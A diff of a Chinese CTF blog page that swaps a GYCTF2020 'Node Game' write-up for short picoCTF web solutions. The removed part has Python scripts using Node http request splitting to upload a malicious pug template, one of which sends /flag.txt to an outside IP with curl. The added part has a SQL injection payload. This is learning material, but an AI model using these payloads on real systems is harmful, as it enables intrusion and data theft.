@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>GYCTF2020 Node Game | 甜筒园</title>
-  <meta name="keywords" content=" ssrf漏洞 ">
-  <meta name="description" content="GYCTF2020 Node Game | 甜筒园">
+  <title>HackPack CTF 2023 | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="HackPack CTF 2023 | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="EZ WEBF12查看源码发现注释中的提示&#x2F;src,访问后查看源码： import flask  app &#x3D; flask.Flask(__name__)  @app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;]) def index():   return flask.send_file(&#39;index.html&#39;)  @app.route(&amp;">
 <meta property="og:type" content="article">
@@ -497,9 +497,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-GYCTF2020-Node-Game" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-HackPack-CTF-2023" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">GYCTF2020 Node Game</h1>
+        <h1 class="article-title">HackPack CTF 2023</h1>
     
     <div class="article-meta">
         
@@ -514,22 +514,15 @@
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color2">ssrf漏洞</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2023-04-15 17:52:11'>2023-04-15 16:32</time>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-03-24 19:01:30'>2023-03-21 16:21</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>字数:1.1k</span>
+        <span>字数:277</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -559,7 +552,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Login-Web-Medium"><span class="toc-text">Login - Web Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Insp3ct0r-Web-Easy"><span class="toc-text">Insp3ct0r - Web Easy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Irish-Name-Repo-3"><span class="toc-text">Irish Name Repo 3</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -575,226 +568,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开题目环境读取源码：</p>
-<p>dd题目源码：</p>
-<pre><code class="javascript">
-var express = require(&#39;express&#39;);
-var app = express();
-var fs = require(&#39;fs&#39;);
-var path = require(&#39;path&#39;);
-var http = require(&#39;http&#39;);
-var pug = require(&#39;pug&#39;);
-var morgan = require(&#39;morgan&#39;);
-const multer = require(&#39;multer&#39;);
-
-
-app.use(multer(&#123;dest: &#39;./dist&#39;&#125;).array(&#39;file&#39;));
-app.use(morgan(&#39;short&#39;));
-app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#39;/uploads&#39;)))
-app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#39;/template&#39;)))
-
-
-app.get(&#39;/&#39;, function(req, res) &#123;
-    var action = req.query.action?req.query.action:&quot;index&quot;;
-    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) )&#123;
-        res.send(&quot;Errrrr, You have been Blocked&quot;);
-    &#125;
-    file = path.join(__dirname + &#39;/template/&#39;+ action +&#39;.pug&#39;);
-    var html = pug.renderFile(file);
-    res.send(html);
-&#125;);
-
-app.post(&#39;/file_upload&#39;, function(req, res)&#123;
-    var ip = req.connection.remoteAddress;
-    var obj = &#123;
-        msg: &#39;&#39;,
-    &#125;
-    if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;
-        obj.msg=&quot;only admin&#39;s ip can use it&quot;
-        res.send(JSON.stringify(obj));
-        return 
-    &#125;
-    fs.readFile(req.files[0].path, function(err, data)&#123;
-        if(err)&#123;
-            obj.msg = &#39;upload failed&#39;;
-            res.send(JSON.stringify(obj));
-        &#125;else&#123;
-            var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;
-            var file_name = req.files[0].originalname
-            var dir_file = __dirname + file_path + file_name
-            if(!fs.existsSync(__dirname + file_path))&#123;
-                try &#123;
-                    fs.mkdirSync(__dirname + file_path)
-                &#125; catch (error) &#123;
-                    obj.msg = &quot;file type error&quot;;
-                    res.send(JSON.stringify(obj));
-                    return
-                &#125;
-            &#125;
-            try &#123;
-                fs.writeFileSync(dir_file,data)
-                obj = &#123;
-                    msg: &#39;upload success&#39;,
-                    filename: file_path + file_name
-                &#125; 
-            &#125; catch (error) &#123;
-                obj.msg = &#39;upload failed&#39;;
-            &#125;
-            res.send(JSON.stringify(obj));    
-        &#125;
-    &#125;)
-&#125;)
-
-app.get(&#39;/source&#39;, function(req, res) &#123;
-    res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;));
-&#125;);
-
-
-app.get(&#39;/core&#39;, function(req, res) &#123;
-    var q = req.query.q;
-    var resp = &quot;&quot;;
-    if (q) &#123;
-        var url = &#39;http://localhost:8081/source?&#39; + q
-        console.log(url)
-        var trigger = blacklist(url);
-        if (trigger === true) &#123;
-            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);
-        &#125; else &#123;
-            try &#123;
-                http.get(url, function(resp) &#123;
-                    resp.setEncoding(&#39;utf8&#39;);
-                    resp.on(&#39;error&#39;, function(err) &#123;
-                    if (err.code === &quot;ECONNRESET&quot;) &#123;
-                     console.log(&quot;Timeout occurs&quot;);
-                     return;
-                    &#125;
-                   &#125;);
-
-                    resp.on(&#39;data&#39;, function(chunk) &#123;
-                        try &#123;
-                         resps = chunk.toString();
-                         res.send(resps);
-                        &#125;catch (e) &#123;
-                           res.send(e.message);
-                        &#125;
- 
-                    &#125;).on(&#39;error&#39;, (e) =&gt; &#123;
-                         res.send(e.message);&#125;);
-                &#125;);
-            &#125; catch (error) &#123;
-                console.log(error);
-            &#125;
-        &#125;
-    &#125; else &#123;
-        res.send(&quot;search param &#39;q&#39; missing!&quot;);
-    &#125;
-&#125;)
-
-function blacklist(url) &#123;
-    var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;];
-    var arrayLen = evilwords.length;
-    for (var i = 0; i &lt; arrayLen; i++) &#123;
-        const trigger = url.includes(evilwords[i]);
-        if (trigger === true) &#123;
-            return true
-        &#125;
-    &#125;
-&#125;
-
-var server = app.listen(8081, function() &#123;
-    var host = server.address().address
-    var port = server.address().port
-    console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)
-&#125;)
+        <h2 id="Login-Web-Medium"><a href="#Login-Web-Medium" class="headerlink" title="Login - Web Medium"></a>Login - Web Medium</h2><p>登录界面只有一个登录框，经过测试用户名是<code>admin</code>，密码不知道，由于抓不到包，怀疑只有前端验证，F12查看<code>index.js</code>内容：</p>
+<pre><code class="js">(async()=&gt;&#123;await new Promise((e=&gt;window.addEventListener(&quot;load&quot;,e))),document.querySelector(&quot;form&quot;).addEventListener(&quot;submit&quot;,(e=&gt;&#123;e.preventDefault();const r=&#123;u:&quot;input[name=username]&quot;,p:&quot;input[name=password]&quot;&#125;,t=&#123;&#125;;for(const e in r)t[e]=btoa(document.querySelector(r[e]).value).replace(/=/g,&quot;&quot;);return&quot;YWRtaW4&quot;!==t.u?alert(&quot;Incorrect Username&quot;):&quot;cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ&quot;!==t.p?alert(&quot;Incorrect Password&quot;):void alert(`Correct Password! Your flag is $&#123;atob(t.p)&#125;.`)&#125;))&#125;)();
 </code></pre>
-<p>文件上传部分要求只能本地上传，想到SSRF漏洞。</p>
-<p>题目也特别强调了 Node 版本为 8.12.0，那么就在网上一搜，发现这个版本的 Node 的 http 模块这里果然有漏洞。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p>
-<p>参考了各位师傅的wp也是一知半解，这里贴出来两种脚本供参考</p>
-<pre><code class="python">import urllib.parse
-import requests
-
-payload = &#39;&#39;&#39; HTTP/1.1
-Host: x
-Connection: keep-alive
-
-POST /file_upload HTTP/1.1
-Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810
-Connection: keep-alive
-cache-control: no-cache
-Host: x
-Content-Length: 294
-
-----------------------------919695033422425209299810
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ttycp3.pug&quot;
-Content-Type: /../template
-
-doctype html
-html
-  head
-    style
-      include ../../../../../../../flag.txt
-
-----------------------------919695033422425209299810--
-
-GET /flag HTTP/1.1
-Host: x
-Connection: close
-x:&#39;&#39;&#39;
-payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)
-payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
-# print(payload)
-r = requests.get(&#39;http://2174017e-6eab-4709-a9cd-7c63651b7684.node3.buuoj.cn/core?q=&#39; + urllib.parse.quote(payload))
-print(r.text)
-#	最后访问?action=ttycp3获得flag
+<p>其中<code>YWRtaW4</code>正好是<code>admin</code>的<code>base64</code>编码， 将<code>cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ</code>解码后获得<code>flag</code></p>
+<pre><code>picoCTF&#123;53rv3r_53rv3r_53rv3r_53rv3r_53rv3r&#125;
 </code></pre>
-<p>反弹shell版本：</p>
-<pre><code class="python">import urllib.parse
-import requests
-
-payload = &quot;&quot;&quot;
-
-POST /file_upload HTTP/1.1
-Host: localhost:8081
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=---------------------------79799747022511107691492167111
-Content-Length:1000
-Origin: http://localhost:8081
-Connection: close
-Referer: http://localhost:8081/?action=upload
-Upgrade-Insecure-Requests: 1
-
------------------------------79799747022511107691492167111
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;
-Content-Type: ../template
-
-- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl 82.157.69.84:12345 -X POST -d `cat /flag.txt`&#39;)
------------------------------79799747022511107691492167111--
-
-
-&quot;&quot;&quot;.replace(&quot;\n&quot;, &quot;\r\n&quot;)
-
-
-def payload_encode(raw):
-    ret = u&quot;&quot;
-    for i in raw:
-        ret += chr(0x0100 + ord(i))  # 替换为高编码unicode字符
-    return ret
-
-
-payload = payload_encode(payload)
-print(payload)
-
-r = requests.get(&#39;http://5f09d3d5-09ee-4742-a142-40df87c9ccf5.node4.buuoj.cn:81/core?q=&#39; + urllib.parse.quote(payload))
-print(r.text)
-r = requests.get(&#39;http://5f09d3d5-09ee-4742-a142-40df87c9ccf5.node4.buuoj.cn:81/?action=shell&#39;)
+<h2 id="Insp3ct0r-Web-Easy"><a href="#Insp3ct0r-Web-Easy" class="headerlink" title="Insp3ct0r - Web Easy"></a>Insp3ct0r - Web Easy</h2><p>根据题目提示在<code>html,css,js</code>中获得三部分flag拼接起来：</p>
+<pre><code>picoCTF&#123;tru3_d3t3ct1ve_0r_ju5t_lucky?&#125;
 </code></pre>
-<p>在自己服务器上开监听即可</p>
-<hr>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://y4tacker.gitee.io/2021/01/28/year/2021/1%E6%9C%88/GYCTF2020-NodeGame/">GYCTF2020-NodeGame</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shinygod/article/details/129000051">[GYCTF2020]Node Game</a></p>
+<h2 id="Irish-Name-Repo-3"><a href="#Irish-Name-Repo-3" class="headerlink" title="Irish Name Repo 3"></a>Irish Name Repo 3</h2><p>打开菜单发现有个登录界面，随便输入密码不对抓包后看见有个debug关键字等于0，修改为1后看到SQL语句，发现传入的字母会进行凯撒密码加密移位，构造payload获得flag</p>
+<pre><code>POST
+debug=1&amp;password=1&#39; be 1&gt;0--+
+</code></pre>
+<pre><code>picoCTF&#123;3v3n_m0r3_SQL&#125;
+</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
